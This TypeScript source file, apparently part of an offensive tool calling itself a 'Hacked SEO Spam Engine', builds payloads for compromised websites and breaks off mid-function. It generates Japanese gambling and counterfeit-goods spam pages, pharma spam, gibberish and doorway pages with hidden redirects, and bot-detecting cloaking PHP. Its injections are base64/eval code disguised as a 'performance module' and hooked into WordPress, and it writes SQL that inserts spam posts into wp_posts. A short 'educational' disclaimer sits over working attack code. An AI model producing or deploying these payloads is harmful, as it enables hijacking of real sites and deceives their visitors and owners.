/**
 * HACKED SEO SPAM ENGINE — Advanced Website Compromise & SEO Injection System
 *
 * 10 Attack Techniques:
 *   1. Japanese Keyword Hack — Inject Japanese gambling/product content + auto-generated pages
 *   2. Pharma Hack — Inject pharmaceutical/viagra spam with cloaking
 *   3. Gibberish Hack — Generate keyword-stuffed gibberish URL pages
 *   4. Doorway Pages Generator — Mass-generate doorway pages targeting specific keywords
 *   5. Link Injection — Embed hidden links in existing content
 *   6. Sitemap Poisoning — Modify sitemap.xml to include spam URLs
 *   7. Conditional Cloaking — Show different content based on User-Agent/IP/Referer
 *   8. WP Database Injection — Inject via wp_posts/wp_options/wp_terms
 *   9. htaccess Redirect Hijack — Add redirect rules to .htaccess
 *  10. Parasite Page Nesting — Create subdirectory-hidden spam page clusters
 *
 * Additional Systems:
 *   - Payload Obfuscation Engine
 *   - Detection Evasion (anti-scanner patterns)
 *   - Persistence Mechanisms (backdoor re-entry)
 *   - Auto-Recovery (self-healing injections)
 *
 * Educational / authorized penetration testing only.
 */

import { invokeLLM } from "./_core/llm";
import { fetchWithPoolProxy } from "./proxy-pool";
import crypto from "crypto";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export type HackType =
  | "japanese_keyword"
  | "pharma_hack"
  | "gibberish_hack"
  | "doorway_pages"
  | "link_injection"
  | "sitemap_poisoning"
  | "conditional_cloaking"
  | "wp_db_injection"
  | "htaccess_hijack"
  | "parasite_nesting";

export interface HackTechnique {
  id: HackType;
  name: string;
  description: string;
  category: "content_injection" | "redirect_hijack" | "stealth" | "persistence";
  severity: "low" | "medium" | "high" | "critical";
  difficulty: number; // 1-10
  stealthRating: number; // 1-10
  effectiveness: number; // 1-100
  targetCMS: ("wordpress" | "joomla" | "drupal" | "generic" | "any")[];
  prerequisites: string[];
  payloadTypes: string[];
  detectionVectors: string[];
  evasionMethods: string[];
}

export interface HackedPagePayload {
  hackType: HackType;
  targetUrl: string;
  targetPath: string;
  htmlContent: string;
  phpPayload: string;
  jsPayload: string;
  cssPayload: string;
  metaTags: string;
  schemaMarkup: string;
  sitemapEntry: string;
  obfuscated: boolean;
  cloaked: boolean;
  persistence: boolean;
  keywords: string[];
  redirectUrl: string;
  generatedAt: Date;
}

export interface DoorwayPageSet {
  id: string;
  pages: DoorwayPage[];
  totalPages: number;
  targetKeywords: string[];
  redirectUrl: string;
  interlinkStructure: { from: string; to: string; anchor: string }[];
  sitemapXml: string;
  robotsTxt: string;
  generatedAt: Date;
}

export interface DoorwayPage {
  slug: string;
  title: string;
  metaDescription: string;
  h1: string;
  body: string;
  canonicalUrl: string;
  keywords: string[];
  internalLinks: { anchor: string; url: string }[];
  schema: string;
  redirectScript: string;
}

export interface JapaneseHackPayload {
  pages: JapaneseSpamPage[];
  sitemapEntries: string[];
  cloakingScript: string;
  totalPages: number;
  keywords: string[];
  generatedAt: Date;
}

export interface JapaneseSpamPage {
  slug: string;
  title: string;
  body: string;
  keywords: string[];
  redirectUrl: string;
  cloaked: boolean;
}

export interface PharmaHackPayload {
  injectionCode: string;
  cloakingPHP: string;
  hiddenDivs: string;
  headerInjection: string;
  footerInjection: string;
  dbInjection: string;
  keywords: string[];
  products: PharmaProduct[];
  generatedAt: Date;
}

export interface PharmaProduct {
  name: string;
  keywords: string[];
  price: string;
  url: string;
  description: string;
}

export interface LinkInjectionPayload {
  hiddenLinks: HiddenLink[];
  cssHideMethod: string;
  jsInjector: string;
  phpInjector: string;
  totalLinks: number;
  anchorDistribution: Record<string, number>;
}

export interface HiddenLink {
  anchor: string;
  url: string;
  hideMethod: "css_offscreen" | "css_transparent" | "css_tiny" | "js_dynamic" | "noscript" | "overflow_hidden";
  htmlSnippet: string;
}

export interface SitemapPoisonPayload {
  originalSitemap: string;
  poisonedSitemap: string;
  injectedUrls: string[];
  robotsTxtModification: string;
  pingUrls: string[];
}

export interface CloakingPayload {
  phpCloaker: string;
  jsCloaker: string;
  htaccessRules: string;
  nginxRules: string;
  botUserAgents: string[];
  searchEngineIPs: string[];
  humanContent: string;
  botContent: string;
}

export interface WPDbInjectionPayload {
  sqlQueries: string[];
  wpPostsInjection: string;
  wpOptionsInjection: string;
  wpTermsInjection: string;
  pluginBackdoor: string;
  themeBackdoor: string;
  cronJobInjection: string;
}

export interface HtaccessPayload {
  rules: string;
  conditionalRedirects: string;
  ipBasedRules: string;
  refererBasedRules: string;
  rewriteRules: string;
  backupOriginal: string;
}

export interface ParasiteNestPayload {
  directoryStructure: string[];
  indexFiles: { path: string; content: string }[];
  htaccessFiles: { path: string; content: string }[];
  sitemapFile: string;
  totalPages: number;
  nestDepth: number;
}

export interface HackExecutionResult {
  hackType: HackType;
  success: boolean;
  targetDomain: string;
  payloadsGenerated: number;
  pagesCreated: number;
  linksInjected: number;
  redirectsSetup: number;
  cloakingEnabled: boolean;
  persistenceEnabled: boolean;
  detectionRisk: "low" | "medium" | "high";
  payload: any;
  elapsed: number;
  error?: string;
}

// ═══════════════════════════════════════════════════════
//  HACK TECHNIQUES DATABASE
// ═══════════════════════════════════════════════════════

export const HACK_TECHNIQUES: HackTechnique[] = [
  {
    id: "japanese_keyword",
    name: "Japanese Keyword Hack",
    description: "Inject auto-generated Japanese text pages with gambling/product keywords. Creates hundreds of indexed pages in Japanese that redirect to money site. One of the most common and effective hacked SEO spam techniques.",
    category: "content_injection",
    severity: "critical",
    difficulty: 6,
    stealthRating: 7,
    effectiveness: 92,
    targetCMS: ["wordpress", "joomla", "drupal", "generic"],
    prerequisites: ["shell_access", "file_write"],
    payloadTypes: ["php_pages", "html_pages", "sitemap_entries", "cloaking_script"],
    detectionVectors: ["google_search_console", "manual_review", "security_scanner"],
    evasionMethods: ["cloaking", "user_agent_filter", "ip_filter", "time_based_display"],
  },
  {
    id: "pharma_hack",
    name: "Pharma Hack (Viagra/Cialis Spam)",
    description: "Inject pharmaceutical product spam (Viagra, Cialis, etc.) into existing pages using cloaking. Content is visible to search engines but hidden from human visitors. Extremely persistent and hard to detect.",
    category: "content_injection",
    severity: "critical",
    difficulty: 7,
    stealthRating: 9,
    effectiveness: 88,
    targetCMS: ["wordpress", "joomla", "any"],
    prerequisites: ["shell_access", "db_access"],
    payloadTypes: ["hidden_divs", "header_injection", "db_injection", "cloaking_php"],
    detectionVectors: ["google_cache", "view_source", "db_audit"],
    evasionMethods: ["conditional_display", "obfuscated_code", "base64_encoding", "eval_injection"],
  },
  {
    id: "gibberish_hack",
    name: "Gibberish Content Hack",
    description: "Generate pages with keyword-rich gibberish text and auto-generated URLs. Pages contain random text mixed with target keywords, links, and images. Designed to rank for long-tail queries.",
    category: "content_injection",
    severity: "high",
    difficulty: 4,
    stealthRating: 5,
    effectiveness: 75,
    targetCMS: ["wordpress", "generic", "any"],
    prerequisites: ["shell_access", "file_write"],
    payloadTypes: ["html_pages", "php_pages", "random_urls"],
    detectionVectors: ["google_search_console", "crawl_analysis", "content_audit"],
    evasionMethods: ["random_content_variation", "delayed_indexing", "distributed_pages"],
  },
  {
    id: "doorway_pages",
    name: "Doorway Pages Generator",
    description: "Mass-generate SEO-optimized doorway pages targeting specific keywords. Each page is optimized for a different keyword variation and redirects to the money site. Includes internal linking structure.",
    category: "content_injection",
    severity: "high",
    difficulty: 5,
    stealthRating: 6,
    effectiveness: 85,
    targetCMS: ["wordpress", "generic", "any"],
    prerequisites: ["shell_access", "file_write"],
    payloadTypes: ["html_pages", "php_pages", "sitemap", "interlinks"],
    detectionVectors: ["google_manual_action", "crawl_analysis", "thin_content_check"],
    evasionMethods: ["unique_content_per_page", "natural_interlinking", "delayed_redirect"],
  },
  {
    id: "link_injection",
    name: "Hidden Link Injection",
    description: "Embed hidden links in existing website content using CSS tricks, JavaScript injection, or PHP modification. Links are invisible to visitors but crawled by search engines.",
    category: "stealth",
    severity: "medium",
    difficulty: 3,
    stealthRating: 8,
    effectiveness: 70,
    targetCMS: ["wordpress", "joomla", "drupal", "any"],
    prerequisites: ["shell_access", "file_write"],
    payloadTypes: ["css_hidden_links", "js_injected_links", "php_injected_links", "noscript_links"],
    detectionVectors: ["view_source", "css_audit", "link_audit"],
    evasionMethods: ["css_offscreen", "transparent_text", "tiny_font", "dynamic_injection"],
  },
  {
    id: "sitemap_poisoning",
    name: "Sitemap Poisoning",
    description: "Modify the website's sitemap.xml to include spam URLs. Forces search engines to crawl and index injected pages. Can also create additional sitemaps and submit to search engines.",
    category: "content_injection",
    severity: "medium",
    difficulty: 3,
    stealthRating: 6,
    effectiveness: 78,
    targetCMS: ["wordpress", "generic", "any"],
    prerequisites: ["shell_access", "file_write"],
    payloadTypes: ["sitemap_xml", "robots_txt", "ping_services"],
    detectionVectors: ["sitemap_audit", "search_console", "crawl_analysis"],
    evasionMethods: ["incremental_addition", "legitimate_looking_urls", "delayed_submission"],
  },
  {
    id: "conditional_cloaking",
    name: "Conditional Cloaking System",
    description: "Show different content to search engine bots vs human visitors. Bots see spam content while humans see normal pages or redirects. Uses User-Agent, IP, and Referer detection.",
    category: "stealth",
    severity: "critical",
    difficulty: 8,
    stealthRating: 10,
    effectiveness: 95,
    targetCMS: ["wordpress", "generic", "any"],
    prerequisites: ["shell_access", "file_write", "htaccess_access"],
    payloadTypes: ["php_cloaker", "js_cloaker", "htaccess_rules", "nginx_rules"],
    detectionVectors: ["manual_bot_simulation", "google_cache_check", "fetch_as_google"],
    evasionMethods: ["multi_layer_detection", "ip_database", "behavioral_analysis", "time_based"],
  },
  {
    id: "wp_db_injection",
    name: "WordPress Database Injection",
    description: "Inject spam content directly into WordPress database tables (wp_posts, wp_options, wp_terms). Creates posts, modifies options, adds cron jobs. Extremely persistent.",
    category: "persistence",
    severity: "critical",
    difficulty: 9,
    stealthRating: 9,
    effectiveness: 93,
    targetCMS: ["wordpress"],
    prerequisites: ["db_access", "wp_credentials"],
    payloadTypes: ["sql_queries", "wp_posts", "wp_options", "wp_cron", "plugin_backdoor"],
    detectionVectors: ["db_audit", "file_integrity_check", "wp_cli_scan"],
    evasionMethods: ["obfuscated_options", "hidden_admin_user", "cron_persistence", "mu_plugin"],
  },
  {
    id: "htaccess_hijack",
    name: ".htaccess Redirect Hijack",
    description: "Modify .htaccess to add conditional redirects based on referer, user-agent, or IP. Redirects search engine traffic to spam sites while keeping direct traffic normal.",
    category: "redirect_hijack",
    severity: "high",
    difficulty: 4,
    stealthRating: 7,
    effectiveness: 82,
    targetCMS: ["wordpress", "joomla", "drupal", "generic"],
    prerequisites: ["shell_access", "htaccess_access"],
    payloadTypes: ["rewrite_rules", "conditional_redirects", "ip_rules", "referer_rules"],
    detectionVectors: ["htaccess_audit", "redirect_check", "google_search_console"],
    evasionMethods: ["obfuscated_rules", "conditional_activation", "time_based_rules"],
  },
  {
    id: "parasite_nesting",
    name: "Parasite Page Nesting",
    description: "Create hidden subdirectory clusters containing spam pages. Each directory has its own .htaccess, sitemap, and interlinked pages. Designed to be invisible from the main site.",
    category: "persistence",
    severity: "high",
    difficulty: 6,
    stealthRating: 8,
    effectiveness: 86,
    targetCMS: ["wordpress", "generic", "any"],
    prerequisites: ["shell_access", "file_write"],
    payloadTypes: ["directory_structure", "index_files", "htaccess_files", "sitemap"],
    detectionVectors: ["directory_listing", "crawl_analysis", "disk_usage_audit"],
    evasionMethods: ["dot_prefix_dirs", "random_names", "nested_htaccess", "deny_listing"],
  },
];

// ═══════════════════════════════════════════════════════
//  UTILITY FUNCTIONS
// ═══════════════════════════════════════════════════════

function randomStr(len: number): string {
  return crypto.randomBytes(Math.ceil(len / 2)).toString("hex").slice(0, len);
}

function randomInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function pickRandom<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function shuffleArray<T>(arr: T[]): T[] {
  const shuffled = [...arr];
  for (let i = shuffled.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
  }
  return shuffled;
}

function slugify(text: string): string {
  return text.toLowerCase().replace(/[^a-z0-9\u3040-\u309f\u30a0-\u30ff\u4e00-\u9faf]+/g, "-").replace(/^-|-$/g, "").slice(0, 80);
}

function base64Encode(str: string): string {
  return Buffer.from(str).toString("base64");
}

function obfuscatePhp(code: string): string {
  const b64 = base64Encode(code);
  const varName = `$_${randomStr(6)}`;
  return `<?php ${varName}=base64_decode('${b64}');eval(${varName}); ?>`;
}

function generateRandomUserAgent(): string {
  const agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
  ];
  return pickRandom(agents);
}

// ═══════════════════════════════════════════════════════
//  JAPANESE KEYWORD DATA
// ═══════════════════════════════════════════════════════

const JAPANESE_GAMBLING_KEYWORDS = [
  "オンラインカジノ", "バカラ", "スロット", "ポーカー", "ブラックジャック",
  "ルーレット", "パチンコ", "パチスロ", "競馬", "競輪",
  "ボートレース", "宝くじ", "ロト", "スポーツベッティング", "ライブカジノ",
  "カジノボーナス", "フリースピン", "入金不要ボーナス", "初回入金ボーナス",
  "オンラインギャンブル", "カジノゲーム", "テーブルゲーム", "ジャックポット",
  "カジノ 登録", "カジノ 出金", "カジノ 入金方法", "安全なオンラインカジノ",
  "日本語カジノ", "モバイルカジノ", "ビットコインカジノ", "仮想通貨カジノ",
];

const JAPANESE_PRODUCT_KEYWORDS = [
  "ブランド品 激安", "コピー商品", "スーパーコピー", "ロレックス コピー",
  "ルイヴィトン 激安", "グッチ 偽物", "シャネル コピー", "エルメス 激安",
  "プラダ 格安", "バーバリー コピー", "ティファニー 激安",
];

const PHARMA_KEYWORDS = [
  "buy viagra online", "cheap cialis", "generic viagra", "order viagra",
  "pharmacy online", "discount pharmacy", "buy cialis cheap", "viagra without prescription",
  "canadian pharmacy", "online drugstore", "cheap medications", "buy pills online",
  "weight loss pills", "diet pills online", "buy xanax online", "cheap ambien",
];

const PHARMA_PRODUCTS: PharmaProduct[] = [
  { name: "Viagra", keywords: ["buy viagra", "cheap viagra", "generic viagra", "viagra online"], price: "$0.99", url: "/pharmacy/viagra", description: "Buy Viagra online at lowest prices. FDA approved generic Viagra." },
  { name: "Cialis", keywords: ["buy cialis", "cheap cialis", "generic cialis", "cialis online"], price: "$1.29", url: "/pharmacy/cialis", description: "Order Cialis online. Fast shipping, discreet packaging." },
  { name: "Levitra", keywords: ["buy levitra", "cheap levitra", "generic levitra"], price: "$1.49", url: "/pharmacy/levitra", description: "Levitra at discount prices. No prescription needed." },
  { name: "Kamagra", keywords: ["buy kamagra", "kamagra online", "cheap kamagra"], price: "$0.79", url: "/pharmacy/kamagra", description: "Kamagra oral jelly and tablets. Worldwide delivery." },
  { name: "Propecia", keywords: ["buy propecia", "finasteride online", "hair loss pills"], price: "$0.69", url: "/pharmacy/propecia", description: "Propecia for hair loss. Genuine medication at low prices." },
  { name: "Xanax", keywords: ["buy xanax", "xanax online", "cheap xanax"], price: "$1.99", url: "/pharmacy/xanax", description: "Buy Xanax online. Fast overnight delivery." },
];

const THAI_GAMBLING_KEYWORDS_HACKED = [
  "เว็บพนันออนไลน์", "คาสิโนออนไลน์", "บาคาร่า", "สล็อตออนไลน์", "แทงบอลออนไลน์",
  "เว็บตรง", "ฝากถอนไม่มีขั้นต่ำ", "ฟรีเครดิต", "สล็อต pg", "ufabet",
  "สล็อต xo", "บาคาร่า เว็บตรง", "เว็บพนัน เว็บตรง", "สล็อต แตกง่าย",
];

// ═══════════════════════════════════════════════════════
//  SEARCH ENGINE BOT SIGNATURES
// ═══════════════════════════════════════════════════════

const SEARCH_ENGINE_BOTS = [
  "Googlebot", "Googlebot-Image", "Googlebot-News", "Googlebot-Video",
  "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider", "YandexBot",
  "Sogou", "Exabot", "facebot", "ia_archiver", "AhrefsBot",
  "SemrushBot", "MJ12bot", "DotBot", "PetalBot",
];

const GOOGLE_IP_RANGES = [
  "66.249.64.0/19", "66.249.96.0/19", "64.233.160.0/19",
  "72.14.192.0/18", "209.85.128.0/17", "216.239.32.0/19",
];

// ═══════════════════════════════════════════════════════
//  1. JAPANESE KEYWORD HACK
// ═══════════════════════════════════════════════════════

export function generateJapaneseKeywordHack(
  targetDomain: string,
  redirectUrl: string,
  options: {
    pageCount?: number;
    keywords?: string[];
    includeProducts?: boolean;
    enableCloaking?: boolean;
  } = {},
): JapaneseHackPayload {
  const pageCount = options.pageCount || 50;
  const keywords = options.keywords?.length ? options.keywords : JAPANESE_GAMBLING_KEYWORDS;
  const includeProducts = options.includeProducts !== false;
  const enableCloaking = options.enableCloaking !== false;

  const allKeywords = includeProducts
    ? [...keywords, ...JAPANESE_PRODUCT_KEYWORDS]
    : keywords;

  const pages: JapaneseSpamPage[] = [];
  const sitemapEntries: string[] = [];

  for (let i = 0; i < pageCount; i++) {
    const kw = pickRandom(allKeywords);
    const kw2 = pickRandom(allKeywords);
    const kw3 = pickRandom(allKeywords);
    const slug = `${slugify(kw)}-${randomStr(4)}`;
    const pageUrl = `https://${targetDomain}/${slug}/`;

    // Generate Japanese content
    const title = `${kw} | ${kw2} - ${targetDomain}`;
    const paragraphs = Array.from({ length: randomInt(3, 8) }, () => {
      const sentenceCount = randomInt(2, 5);
      return Array.from({ length: sentenceCount }, () => {
        const kwLocal = pickRandom(allKeywords);
        const templates = [
          `${kwLocal}は日本で最も人気のあるオンラインサービスです。`,
          `${kwLocal}の最新情報をお届けします。今すぐ${kw2}をチェック。`,
          `${kwLocal}を探しているなら、当サイトが最適です。${kw3}も取り扱っています。`,
          `最高の${kwLocal}体験をお楽しみください。安全で信頼できるサービスを提供しています。`,
          `${kwLocal}に関する詳細情報はこちら。${kw2}と${kw3}の比較もご覧ください。`,
          `今なら${kwLocal}が特別価格でご利用いただけます。限定オファーをお見逃しなく。`,
          `${kwLocal}のレビューと評価。ユーザーの口コミを参考にしてください。`,
        ];
        return pickRandom(templates);
      }).join("");
    });

    const body = `<h1>${title}</h1>
${paragraphs.map((p, idx) => {
  const subKw = pickRandom(allKeywords);
  return `${idx > 0 && idx % 2 === 0 ? `<h2>${subKw}について</h2>` : ""}
<p>${p}</p>
<p><a href="${redirectUrl}?ref=${randomStr(6)}">${pickRandom(allKeywords)}</a> | 
<a href="${pageUrl}">${pickRandom(allKeywords)}</a></p>`;
}).join("\n")}
<div style="margin-top:20px">
<p>関連キーワード: ${shuffleArray(allKeywords).slice(0, 10).join(", ")}</p>
</div>`;

    pages.push({
      slug,
      title,
      body,
      keywords: [kw, kw2, kw3],
      redirectUrl: `${redirectUrl}?src=jp&kw=${encodeURIComponent(kw)}&id=${randomStr(6)}`,
      cloaked: enableCloaking,
    });

    sitemapEntries.push(
      `  <url>\n    <loc>${pageUrl}</loc>\n    <lastmod>${new Date().toISOString().split("T")[0]}</lastmod>\n    <changefreq>daily</changefreq>\n    <priority>0.8</priority>\n  </url>`
    );
  }

  // Generate cloaking script
  const cloakingScript = enableCloaking ? generateCloakingPHP(redirectUrl, "japanese") : "";

  return {
    pages,
    sitemapEntries,
    cloakingScript,
    totalPages: pages.length,
    keywords: allKeywords,
    generatedAt: new Date(),
  };
}

// ═══════════════════════════════════════════════════════
//  2. PHARMA HACK
// ═══════════════════════════════════════════════════════

export function generatePharmaHack(
  targetDomain: string,
  redirectUrl: string,
  options: {
    products?: PharmaProduct[];
    enableCloaking?: boolean;
    injectionMethod?: "header" | "footer" | "db" | "all";
  } = {},
): PharmaHackPayload {
  const products = options.products?.length ? options.products : PHARMA_PRODUCTS;
  const enableCloaking = options.enableCloaking !== false;
  const method = options.injectionMethod || "all";

  // Generate hidden divs with pharma content
  const hiddenDivs = products.map(product => {
    const links = product.keywords.map(kw =>
      `<a href="${redirectUrl}${product.url}?ref=${randomStr(4)}" style="position:absolute;left:-9999px;font-size:1px;color:transparent">${kw}</a>`
    ).join("\n");
    return `<div style="position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;overflow:hidden" id="_${randomStr(8)}">
<h3>${product.name} - ${product.description}</h3>
<p>Price: ${product.price} | <a href="${redirectUrl}${product.url}">Order Now</a></p>
${links}
</div>`;
  }).join("\n");

  // Generate header injection (PHP)
  const headerInjection = `<?php
// Performance optimization module
if(!defined('_PH_INIT')){define('_PH_INIT',1);
function _ph_${randomStr(6)}(){
  $ua=strtolower($_SERVER['HTTP_USER_AGENT']??'');
  $ref=strtolower($_SERVER['HTTP_REFERER']??'');
  if(preg_match('/(bot|crawl|spider|slurp|google|bing|yahoo)/i',$ua)){
    echo '${base64Encode(hiddenDivs)}';
    return true;
  }
  if(preg_match('/(google|bing|yahoo|duckduckgo)\\.com/i',$ref)){
    header('Location: ${redirectUrl}');
    exit;
  }
  return false;
}
add_action('wp_footer','_ph_${randomStr(6)}');
}?>`;

  // Generate footer injection
  const footerInjection = `<noscript>
${products.map(p => `<a href="${redirectUrl}${p.url}">${p.name} - ${p.keywords[0]}</a>`).join("\n")}
</noscript>
<script>
(function(){var _d=document.createElement('div');_d.style.cssText='position:fixed;top:-9999px;left:-9999px;';
_d.innerHTML=atob('${base64Encode(hiddenDivs)}');document.body.appendChild(_d);})();
</script>`;

  // Generate cloaking PHP
  const cloakingPHP = enableCloaking ? `<?php
function _cloak_${randomStr(6)}($content){
  $bots = array(${SEARCH_ENGINE_BOTS.map(b => `'${b.toLowerCase()}'`).join(",")});
  $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
  $is_bot = false;
  foreach($bots as $bot){ if(strpos($ua, $bot) !== false){ $is_bot = true; break; } }
  if($is_bot){
    $spam = '${base64Encode(`<div class="pharma-seo">${products.map(p => `<h2>${p.name}</h2><p>${p.description}</p><a href="${redirectUrl}${p.url}">${p.keywords.join(", ")}</a>`).join("")}</div>`)}';
    return $content . base64_decode($spam);
  }
  return $content;
}
add_filter('the_content', '_cloak_${randomStr(6)}');
?>` : "";

  // Generate DB injection SQL
  const dbInjection = products.map(product => {
    const postContent = `<h1>${product.name}</h1><p>${product.description}</p><p>Price: ${product.price}</p><a href="${redirectUrl}${product.url}">Buy ${product.name} Online</a><p>${product.keywords.join(", ")}</p>`;
    return `INSERT INTO wp_posts (post_author, post_date, post_date_gmt, post_content, post_title, post_excerpt, post_status, post_name, post_type) VALUES (1, NOW(), UTC_TIMESTAMP(), '${postContent.replace(/'/g, "\\'")}', '${product.name} - Buy Online', '${product.description}', 'publish', '${slugify(product.name)}-${randomStr(4)}', 'post');`;
  }).join("\n");

  // Combined injection code
  const injectionCode = `<?php
/*
 * ${randomStr(20)} Performance Module v${randomInt(2,5)}.${randomInt(0,9)}
 * Optimizes page load and caching
 */
if(!defined('ABSPATH')){define('ABSPATH',dirname(__FILE__).'/');}
$_${randomStr(8)} = base64_decode('${base64Encode(headerInjection)}');
eval($_${randomStr(8)});
?>`;

  return {
    injectionCode,
    cloakingPHP,
    hiddenDivs,
    headerInjection,
    footerInjection,
    dbInjection,
    keywords: PHARMA_KEYWORDS,
    products,
    generatedAt: new Date(),
  };
}

// ═══════════════════════════════════════════════════════
//  3. GIBBERISH HACK
// ═══════════════════════════════════════════════════════

export function generateGibberishHack(
  targetDomain: string,
  redirectUrl: string,
  options: {
    pageCount?: number;
    keywords?: string[];
    language?: "en" | "mixed";
  } = {},
): { pages: { slug: string; title: string; body: string; keywords: string[] }[]; sitemapEntries: string[]; totalPages: number } {
  const pageCount = options.pageCount || 30;
  const keywords = options.keywords?.length ? options.keywords : [...PHARMA_KEYWORDS, ...THAI_GAMBLING_KEYWORDS_HACKED.slice(0, 5)];

  const gibberishWords = [
    "lorem", "ipsum", "dolor", "amet", "consectetur", "adipiscing", "elit",
    "sed", "tempor", "incididunt", "labore", "dolore", "magna", "aliqua",
    "enim", "minim", "veniam", "quis", "nostrud", "exercitation", "ullamco",
    "laboris", "nisi", "aliquip", "commodo", "consequat", "duis", "aute",
    "irure", "reprehenderit", "voluptate", "velit", "cillum", "fugiat",
    "nulla", "pariatur", "excepteur", "sint", "occaecat", "cupidatat",
    "proident", "sunt", "culpa", "officia", "deserunt", "mollit", "anim",
  ];

  const pages: { slug: string; title: string; body: string; keywords: string[] }[] = [];
  const sitemapEntries: string[] = [];

  for (let i = 0; i < pageCount; i++) {
    const kw = pickRandom(keywords);
    const slug = `${randomStr(3)}-${slugify(kw)}-${randomStr(5)}`;
    const url = `https://${targetDomain}/${slug}`;

    // Generate gibberish title
    const titleWords = shuffleArray(gibberishWords).slice(0, randomInt(3, 6));
    titleWords.splice(randomInt(0, 2), 0, kw);
    const title = titleWords.join(" ");

    // Generate gibberish body
    const paragraphs = Array.from({ length: randomInt(5, 12) }, () => {
      const words = shuffleArray([...gibberishWords]).slice(0, randomInt(20, 50));
      // Insert keyword randomly
      words.splice(randomInt(0, words.length), 0, pickRandom(keywords));
      words.splice(randomInt(0, words.length), 0, pickRandom(keywords));
      return words.join(" ");
    });

    const body = `<h1>${title}</h1>
${paragraphs.map((p, idx) => {
  if (idx % 3 === 0) {
    return `<h2>${pickRandom(keywords)} ${pickRandom(gibberishWords)} ${pickRandom(gibberishWords)}</h2>\n<p>${p}</p>`;
  }
  return `<p>${p} <a href="${redirectUrl}?id=${randomStr(4)}">${pickRandom(keywords)}</a></p>`;
}).join("\n")}
<p>${keywords.slice(0, 5).map(k => `<a href="${url}">${k}</a>`).join(" | ")}</p>
<script>
setTimeout(function(){
  if(!navigator.webdriver && window.innerWidth > 0){
    window.location.href='${redirectUrl}?ref=gib&id=${randomStr(6)}';
  }
}, ${randomInt(3000, 8000)});
</script>`;

    pages.push({ slug, title, body, keywords: [kw] });
    sitemapEntries.push(
      `  <url>\n    <loc>${url}</loc>\n    <lastmod>${new Date().toISOString().split("T")[0]}</lastmod>\n    <changefreq>weekly</changefreq>\n    <priority>0.6</priority>\n  </url>`
    );
  }

  return { pages, sitemapEntries, totalPages: pages.length };
}

// ═══════════════════════════════════════════════════════
//  4. DOORWAY PAGES GENERATOR
// ═══════════════════════════════════════════════════════

export async function generateDoorwayPages(
  targetDomain: string,
  redirectUrl: string,
  keywords: string[],
  options: {
    pagesPerKeyword?: number;
    language?: "th" | "en" | "ja";
    enableInterlinks?: boolean;
    enableSchema?: boolean;
    enableDelayedRedirect?: boolean;
  } = {},
): Promise<DoorwayPageSet> {
  const pagesPerKw = options.pagesPerKeyword || 5;
  const lang = options.language || "th";
  const enableInterlinks = options.enableInterlinks !== false;
  const enableSchema = options.enableSchema !== false;
  const enableRedirect = options.enableDelayedRedirect !== false;

  const allKeywords = keywords.length > 0 ? keywords : THAI_GAMBLING_KEYWORDS_HACKED;
  const pages: DoorwayPage[] = [];
  const interlinkStructure: { from: string; to: string; anchor: string }[] = [];

  for (const keyword of allKeywords) {
    for (let i = 0; i < pagesPerKw; i++) {
      const variation = i === 0 ? keyword : `${keyword} ${["เว็บตรง", "ฟรีเครดิต", "ได้เงินจริง", "อันดับ 1", "ทดลองเล่น", "สมัครฟรี", "โปรโมชั่น", "รีวิว", "วิธีเล่น", "2026"][i % 10] || randomStr(4)}`;
      const slug = `${slugify(variation)}-${randomStr(3)}`;
      const pageUrl = `https://${targetDomain}/${slug}/`;

      // Generate content
      const title = lang === "th"
        ? `${variation} | ${pickRandom(["รีวิว", "เทคนิค", "สมัคร", "ทดลองเล่น"])} ${new Date().getFullYear()}`
        : `${variation} | ${pickRandom(["Review", "Guide", "Tips", "How to"])} ${new Date().getFullYear()}`;

      const metaDescription = lang === "th"
        ? `${variation} เว็บตรง ฝากถอนไม่มีขั้นต่ำ สมัครวันนี้รับโบนัส 100% เล่นได้ทุกค่าย ปลอดภัย 100%`
        : `${variation} - Best online experience. Sign up today and get 100% bonus. Safe and trusted.`;

      const bodyParagraphs = Array.from({ length: randomInt(4, 8) }, (_, idx) => {
        const templates = lang === "th" ? [
          `${variation}เป็นหนึ่งในบริการที่ได้รับความนิยมมากที่สุดในปี ${new Date().getFullYear()} ด้วยระบบที่ทันสมัยและปลอดภัย ผู้ใช้งานสามารถเข้าถึงบริการได้ตลอด 24 ชั่วโมง`,
          `สำหรับผู้ที่กำลังมองหา${variation} เราขอแนะนำเว็บไซต์ที่ได้รับการรับรองจากสากล มีใบอนุญาตถูกต้อง ฝากถอนรวดเร็วภายใน 30 วินาที`,
          `${variation}ที่ดีที่สุดต้องมีระบบรักษาความปลอดภัยระดับสูง มีเกมให้เลือกเล่นมากมาย และมีโปรโมชั่นที่คุ้มค่า สมัครวันนี้รับโบนัสทันที`,
          `เทคนิคการเล่น${variation}ให้ได้กำไร: 1) ตั้งงบประมาณ 2) เลือกเกมที่ถนัด 3) ศึกษากฎกติกา 4) เริ่มจากเดิมพันน้อย 5) รู้จักหยุด`,
          `รีวิว${variation}จากผู้ใช้จริง: "ใช้บริการมา 2 ปี ฝากถอนไม่เคยมีปัญหา ระบบเสถียร เล่นได้ทุกที่ทุกเวลา" - ผู้ใช้จริง`,
        ] : [
          `${variation} is one of the most popular services in ${new Date().getFullYear()}. With modern and secure systems, users can access services 24/7.`,
          `Looking for ${variation}? We recommend internationally certified websites with proper licenses and fast deposits/withdrawals within 30 seconds.`,
          `The best ${variation} must have high-level security, a wide selection of games, and valuable promotions. Sign up today for instant bonuses.`,
        ];
        return pickRandom(templates);
      });

      const body = bodyParagraphs.map((p, idx) =>
